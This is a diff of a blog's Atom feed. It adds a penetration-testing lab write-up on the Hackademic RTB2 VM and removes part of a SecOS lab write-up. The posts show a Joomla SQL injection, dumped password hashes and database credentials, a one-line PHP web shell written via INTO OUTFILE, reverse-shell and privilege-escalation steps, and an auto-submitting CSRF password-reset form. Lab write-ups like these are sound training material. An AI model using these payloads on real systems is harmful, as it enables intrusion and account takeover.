@@ -4,7 +4,7 @@
   <title><![CDATA[Core dump overflow]]></title>
   <link href="http://chousensha.github.io/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2016-07-18T12:57:26-04:00</updated>
+  <updated>2016-07-27T08:55:10-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,291 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Pentest lab - Hackademic RTB2]]></title>
+    <link href="http://chousensha.github.io/blog/2016/07/20/pentest-lab-hackademic-rtb2/"/>
+    <updated>2016-07-20T13:36:20-04:00</updated>
+    <id>http://chousensha.github.io/blog/2016/07/20/pentest-lab-hackademic-rtb2</id>
+    <content type="html"><![CDATA[<p>The objective is the same as the previous one, get root and read key.txt</p>
+
+<!-- more -->
+
+
+<h1>Recon</h1>
+
+<p>Again, this will be a web hacking mission, only web server is available.</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb2-web.png" title="hackademic" alt="hackademic website"></p>
+
+<p>There was nothing in the source code, no suspicious headers, no sql injection in the login. I ran OpenVAS, Dirbuster and Nikto on the target, but nothing more was uncovered other than a Phpmyadmin interface, which kept giving me &ldquo;unable to connect to MySQL server&rdquo; errors no matter what I did. I assumed that maybe the web server is a false front and that might be something else hidden on the machine, so I ran a UDP scan next, which revealed an additional port:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sU -F -n -T4 192.168.80.166
+</span><span class='line'>PORT     STATE SERVICE  REASON
+</span><span class='line'>5353/udp open  zeroconf udp-response ttl 255</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Further internet research and a version scan implied that this was the <a href="https://en.wikipedia.org/wiki/Multicast_DNS">Multicast DNS</a> protocol. I couldn&rsquo;t find anything to exploit it, though. But it made me want to take a closer look at Nmap&rsquo;s results again, so I ran another scan:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nmap  -p- 192.168.80.166
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.49BETA5 ( https://nmap.org ) at 2016-07-21 08:14 EDT
+</span><span class='line'>Nmap scan report for 192.168.80.166
+</span><span class='line'>Host is up, received arp-response (0.00024s latency).
+</span><span class='line'>Not shown: 65533 closed ports, 1 filtered port
+</span><span class='line'>Reason: 65533 resets and 1 port-unreach
+</span><span class='line'>PORT   STATE SERVICE REASON
+</span><span class='line'>80/tcp open  http    syn-ack ttl 64</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This time I read it more carefully and I noticed it reported a filtered port. I ran Nmap again with the verbose flags and <code>&mdash;packet-trace</code> option and this time it returned a new port:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PORT    STATE SERVICE REASON
+</span><span class='line'>80/tcp  open  http    syn-ack ttl 64
+</span><span class='line'>666/tcp open  doom    syn-ack ttl 64</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This must have been the previously reported as filtered port. Version scanning revealed that this was actually another web server!</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>666/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.14 ((Ubuntu))</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Before continuing, I am taking a detour here because it seems I had bypassed a secion of the challenge. When I came back to resume working on this VM, I couldn&rsquo;t get the 666 port to open, and I had no idea what triggered it. I looked at g0tmi1lk&rsquo;s video and it turns out there is a SQLi string that you can insert into the password field of the first web server that gives you a different response. The string is <code>&lsquo; or 1=1&mdash;&rsquo;</code>. I previously tested this parameter with sqlmap and also inserting another variation of this string, with no satisfactory answer. I assumed maybe it&rsquo;s hardcoded, because the slightest change, as in putting a space after the comment character invalidates it. Anyway, with this injection attempt you are taken to a page that says &ldquo;Ok, nice shot&hellip;&hellip;but, you are looking in a wrong place bro! ;&ndash;)&rdquo;. In the source, there was a URL encoded string:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%33%65%20%30%64%20%30%61%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%32%30%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%32%30%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%36%39%20%36%65%20%32%37%20%32%30%20%36%66%20%36%65%20%32%30%20%36%38%20%36%35%20%36%31%20%37%36%20%36%35%20%36%65%20%32%37%20%37%33%20%32%30%20%36%34%20%36%66%20%36%66%20%37%32%20%32%30%20%32%65%20%32%65%20%32%30%20%33%61%20%32%39%20%30%64%20%30%61%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%30%64%20%30%61%20%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%33%65%0A</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Decoding it yielded a hex string this time:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e 0d 0a 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 69 6e 27 20 6f 6e 20 68 65 61 76 65 6e 27 73 20 64 6f 6f 72 20 2e 2e 20 3a 29 0d 0a 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 31 30 31 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 31 30 31 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 31 20 30 30 31 31 31 30 31 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 0d 0a 3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After decoding the hex string, I got this message:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;---------&gt;
+</span><span class='line'>Knock Knock Knockin' on heaven's door .. :)
+</span><span class='line'>00110001 00110000 00110000 00110001 00111010 00110001 00110001 00110000 00110001 00111010 00110001 00110000 00110001 00110001 00111010 00110001 00110000 00110000 00110001
+</span><span class='line'>&lt;---------&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Alright, this is a reference to <a href="https://en.wikipedia.org/wiki/Port_knocking">port knocking</a>. I further decoded the binary data to ascii by using <a href="http://www.snarkles.net/scripts/sneak/sneak.php">this site</a> and got the string <em>1001:1101:1011:1001</em>. So I assumed this string will need to be given to the host in order to open up the port.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#!/bin/bash
+</span><span class='line'>for i in 1001 1101 1011 1001
+</span><span class='line'>do
+</span><span class='line'>nc 192.168.80.167 80 $i
+</span><span class='line'>done</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Indeed, now the 666 port was opened. Not sure how I previously got to it without going through the sequence</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb2-hidden.png" title="hidden web server" alt="hidden web server"></p>
+
+<p>Ok, back to hacking! First thing I noticed was a really old Joomla version, so I fired up <code>joomscan</code> and among the 4 vulnerabilities found, I show here one that seemed more interesting:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Info -&gt; CorePlugin: TinyMCE TinyBrowser addon multiple vulnerabilities 
+</span><span class='line'>Versions effected: Joomla! 1.5.12 
+</span><span class='line'>Check: /plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/
+</span><span class='line'>Exploit: While Joomla! team announced only File Upload vulnerability, in fact there are many. See: http://www.milw0rm.com/exploits/9296
+</span><span class='line'>Vulnerable? Yes</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ok, let&rsquo;s keep this in mind and continue looking. I ran Nikto against this new web server and it reported entries in robots.txt!</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>User-agent: *
+</span><span class='line'>Disallow: /administrator/
+</span><span class='line'>Disallow: /cache/
+</span><span class='line'>Disallow: /components/
+</span><span class='line'>Disallow: /images/
+</span><span class='line'>Disallow: /includes/
+</span><span class='line'>Disallow: /installation/
+</span><span class='line'>Disallow: /language/
+</span><span class='line'>Disallow: /libraries/
+</span><span class='line'>Disallow: /media/
+</span><span class='line'>Disallow: /modules/
+</span><span class='line'>Disallow: /plugins/
+</span><span class='line'>Disallow: /templates/
+</span><span class='line'>Disallow: /tmp/
+</span><span class='line'>Disallow: /xmlrpc/</span></code></pre></td></tr></table></div></figure>
+
+
+<h1>Exploit</h1>
+
+<p>I visited those directories but there was nothing interesting. The administrator one contained a message stating that I am not the real administrator. So I went back to testing for SQLi in the login page and in the URL parameters. In particular, I was interested by the <em>Itemid</em> parameter. When I tampered with it, I got messages that I need to login to view that area of the site. I used sqlmap but no vulnerability found. Seeing so many parameters in the URL, I decided to test each one of them by visiting every page and trying a single quote in every parameter. And the jackpot was found at the <code>letter</code> parameter in the List contents page:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.80.166:666/index.php?option=com_abc&view=abc&letter=%27&Itemid=3
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' GROUP BY title ORDER BY title' at line 1 SQL=SELECT id, title FROM jos_content WHERE state = 1 AND UPPER(title) LIKE ''%' GROUP BY title ORDER BY title
+</span><span class='line'>'</span></code></pre></td></tr></table></div></figure>
+
+
+<p>With this information, I pointed sqlmap to the vulnerable parameter and retrieved the jos_users table of the joomla database, where among others, there were usernames and password hashes</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>username usertype    password
+</span><span class='line'>Administrator Super Administrator 08f43b7f40fb0d56f6a8fb0271ec4710:n9RMVci9nqTUog3GjVTNP7IuOrPayqAl
+</span><span class='line'>JSmith    Registered  992396d7fc19fd76393f359cb294e300:70NFLkBrApLamH9VNGjlViJLlJsB60KF
+</span><span class='line'>BTallor   Registered  abe1ae513c16f2a021329cc109071705:FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy
+</span><span class='line'>hacky Registered  19630caea014ce1746ec41b074973c04:LSGCiJLhUyxZRLOMAcy96PTmbN8nnxIL</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Well, these hashes won&rsquo;t help much, as a quick search didn&rsquo;t give me any way to crack them fast and easy. I did research a bit on the internet and found out that these are salted hashes, stored in the format <code>md5 hash:salt</code>. I also found there is a Perl script that can help with cracking such hashes, called <a href="http://morxploit.com/joomlacrack.txt">joomlacrack.pl</a>. But I thought I might not need to crack them if I could use sqlmap to execute commands on the server and write a PHP backdoor there. So that&rsquo;s what I tried next. Passing <em>pwd</em> to <em>&mdash;os-cmd</em> gave me the location of the current directory, which is /var/www. I tried writing a shell directly in this location but I failed. So next I listed the contents of the present directory and noticed a <em>configuration.php</em> file that I read, and inside there were credentials for the database:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/* Database Settings */
+</span><span class='line'>var $dbtype = 'mysql';
+</span><span class='line'>var $host = 'localhost';
+</span><span class='line'>var $user = 'root';
+</span><span class='line'>var $password = 'yUtJklM97W';
+</span><span class='line'>var $db = 'joomla';
+</span><span class='line'>var $dbprefix = 'jos_';</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I went to the phpmyadmin interface and logged in as root. Then I was able to use SQL to create a rudimentary shell:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">SELECT</span>
+</span><span class='line'><span class="ss">&quot;&lt;? system($_REQUEST[&#39;cmd&#39;]); ?&gt;&quot;</span>
+</span><span class='line'><span class="k">INTO</span> <span class="n">OUTFILE</span> <span class="ss">&quot;/var/www/cmd.php&quot;</span><span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After uploading this shell, I used to download the reverse PHP shell that I hosted with Python&rsquo;s SimpleHTTPServer. And then I navigated to it and received the connection on my Netcat listener:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Linux HackademicRTB2 2.6.32-24-generic #39-Ubuntu SMP Wed Jul 28 06:07:29 UTC 2010 i686 GNU/Linux
+</span><span class='line'> 15:14:37 up  4:02,  0 users,  load average: 0.00, 0.00, 0.00
+</span><span class='line'>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class='line'>/bin/sh: can't access tty; job control turned off</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The local exploit that worked was the same one I used in the previous Hackademic challenge, the <a href="https://www.exploit-db.com/exploits/15285/">RDS Protocol Local Privilege Escalation exploit</a>. Again, I used wget to download it from my machine and ran it:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[snipped]
+</span><span class='line'>[*] Restoring function pointer...
+</span><span class='line'>id
+</span><span class='line'>uid=0(root) gid=0(root)
+</span><span class='line'>ls /root/
+</span><span class='line'>Desktop
+</span><span class='line'>Key.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Trying to read the key gave a huge base64 encoded string, so I copied it to the web server directory, gave it permissions for everyone, and then I downloaded it on my machine, where I could decode it:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~/Downloads#base64 -d key.txt &gt; decoded
+</span><span class='line'>root@pwnbox:~/Downloads#file decoded
+</span><span class='line'>decoded: PNG image data, 756 x 344, 8-bit/color RGB, non-interlaced</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So it&rsquo;s an image! (when I tried reading it there was binary garbage, so I assumed it must be another type of file than a text one). I used this <a href="http://codebeautify.org/base64-to-image-converter">base64 to image converter</a> to see the image:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb2-win.png" title="hackademic rtb2" alt="hackademic rtb 2 finished"></p>
+
+<h1>Debriefing</h1>
+
+<p>This host implemented a sneaky defense of port knocking in order to serve the second web server. It was a bit unrealistic to require a hardcoded value for the password parameter on the first web server in my opinion. The second server was vulnerable to real SQL injection that could read files on the system and execute commands. Having the database root credentials readily available allowed me to gain a foothold on the machine, from which the only step left was finding an exploit that would give me root.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/ You are only young once, but you can \
+</span><span class='line'>\ stay immature indefinitely.          /
+</span><span class='line'> --------------------------------------
+</span><span class='line'>        \   ^__^
+</span><span class='line'>         \  (oo)\_______
+</span><span class='line'>            (__)\       )\/\
+</span><span class='line'>                ||----w |
+</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
+
+
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Pentest lab - Hackademic RTB1]]></title>
@@ -21129,369 +21414,6 @@ security of the host and any other docker VM&rsquo;s on it.</p></blockquote>
 
 
 <blockquote><p>You will be run over by a beer truck.</p></blockquote>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Pentest lab - SecOS]]></title>
-    <link href="http://chousensha.github.io/blog/2015/02/04/pentest-lab-secos/"/>
-    <updated>2015-02-04T06:36:51-05:00</updated>
-    <id>http://chousensha.github.io/blog/2015/02/04/pentest-lab-secos</id>
-    <content type="html"><![CDATA[<p>SecOS is a web based VM created by PaulSec. Here is the briefing:</p>
-
-<blockquote><p>Not too tired after BSides London? Still want to solve challenges? Here is the VM I told about during my talk where you&rsquo;ll have to practice some of
-your skills to retrieve the precious flag located here: /root/flag.txt. This VM is an entry-level boot2root and is web based.</p></blockquote>
-
-<!-- more -->
-
-
-<p>The beginning should be familiar by now&hellip;</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -A -p1-65535 192.168.80.128
-</span><span class='line'>
-</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-04 13:36 EET
-</span><span class='line'>Nmap scan report for 192.168.80.128
-</span><span class='line'>Host is up (0.00085s latency).
-</span><span class='line'>Not shown: 65533 closed ports
-</span><span class='line'>PORT     STATE SERVICE VERSION
-</span><span class='line'>22/tcp   open  ssh     (protocol 2.0)
-</span><span class='line'>| ssh-hostkey: 
-</span><span class='line'>|   1024 9b:d9:32:f5:1d:19:88:d3:e7:af:f0:4e:21:76:7a:c8 (DSA)
-</span><span class='line'>|   2048 90:b0:3d:99:ed:5b:1b:e1:d4:e6:b5:dd:e9:70:89:f5 (RSA)
-</span><span class='line'>|_  256 78:2a:d9:e3:63:83:24:dc:2a:d4:f6:4a:ac:2c:70:5a (ECDSA)
-</span><span class='line'>8081/tcp open  http    Node.js (Express middleware)
-</span><span class='line'>|_http-title: Secure Web App
-</span><span class='line'>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
-</span><span class='line'>SF-Port22-TCP:V=6.47%I=7%D=2/4%Time=54D20435%P=x86_64-unknown-linux-gnu%r(
-</span><span class='line'>SF:NULL,27,"SSH-2\.0-OpenSSH_6\.6p1\x20Ubuntu-2ubuntu1\r\n");
-</span><span class='line'>MAC Address: 00:0C:29:F4:5D:DC (VMware)
-</span><span class='line'>Device type: general purpose
-</span><span class='line'>Running: Linux 3.X
-</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3
-</span><span class='line'>OS details: Linux 3.11 - 3.14</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Let&rsquo;s see what&rsquo;s running on port 8081:</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/secos/site.png" title="secos site" alt="site"></p>
-
-<p>Looking at the about page, we can see the site is really secure!</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/secos/about.png" title="secos about" alt="about"></p>
-
-<p>Also, there is some sort of hint in the source code:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="c">&lt;!--&lt;li&gt;&lt;a href=&quot;/hint&quot;&gt;Wanna help?&lt;/a&gt;&lt;/li&gt;!--&gt;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Checking that page, there is this message:</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/secos/doh.png" title="troll" alt="troll"></p>
-
-<p>Well, there is something to see in the source code:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="c">&lt;!--</span>
-</span><span class='line'><span class="c">        First: the admin visits the website (really) frequently</span>
-</span><span class='line'><span class="c">        Second: He runs it locally, on 127.0.0.1. </span>
-</span><span class='line'><span class="c">        Third: CSRF and /(http:\/\/[-\/\.\w:0-9\?&amp;]+)/gi, I think that&#39;s enough</span>
-</span><span class='line'><span class="c">        !--&gt;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>I created a user to check the functionality of the app. It seems you can send and receive messages between users. The spiderman user is the admin, so we&rsquo;re mainly interested in that account. Using the hint, the likely course seems to be crafting a CSRF request to change the admin&rsquo;s password and sending it to him in a message.</p>
-
-<p>First, a HTML form that will take care of resetting the password:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;html&gt;</span>
-</span><span class='line'><span class="nt">&lt;body&gt;</span>
-</span><span class='line'><span class="nt">&lt;form</span> <span class="na">name=</span><span class="s">&quot;changepass&quot;</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span> <span class="na">action=</span><span class="s">&quot;http://127.0.0.1:8081/change-password&quot;</span><span class="nt">&gt;</span>
-</span><span class='line'><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;username&quot;</span> <span class="na">value=</span><span class="s">&quot;spiderman&quot;</span><span class="nt">&gt;</span>
-</span><span class='line'><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;password&quot;</span> <span class="na">value=</span><span class="s">&quot;pwned&quot;</span><span class="nt">&gt;</span>
-</span><span class='line'><span class="nt">&lt;/form&gt;</span>
-</span><span class='line'><span class="nt">&lt;script </span><span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span><span class="nt">&gt;</span>
-</span><span class='line'><span class="nb">document</span><span class="p">.</span><span class="nx">changepass</span><span class="p">.</span><span class="nx">submit</span><span class="p">();</span>
-</span><span class='line'><span class="nt">&lt;/script&gt;</span>
-</span><span class='line'><span class="nt">&lt;/body&gt;</span>
-</span><span class='line'><span class="nt">&lt;/html&gt;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Breaking it up, the form submits the username and password (which are hidden because we are using Javascript to send them to the server, and not clicking buttons ourselves) to the change password page. Because of the hint we found in the source code, we are using the localhost address instead of the machine&rsquo;s IP. I copied it to <code>/var/www/</code> and served it with apache.</p>
-
-<p>And now to send a message to spiderman, with a URL for him to click:</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/secos/sendcsrf.png" title="sendcsrf" alt="sendcsrf"></p>
-
-<p>Success! His password was reset and we can log in with the new password that we&rsquo;ve just set. In the Messages section, we see that another user also had less than honorable intentions:</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/secos/pirate.png" title="pirate" alt="pirate"></p>
-
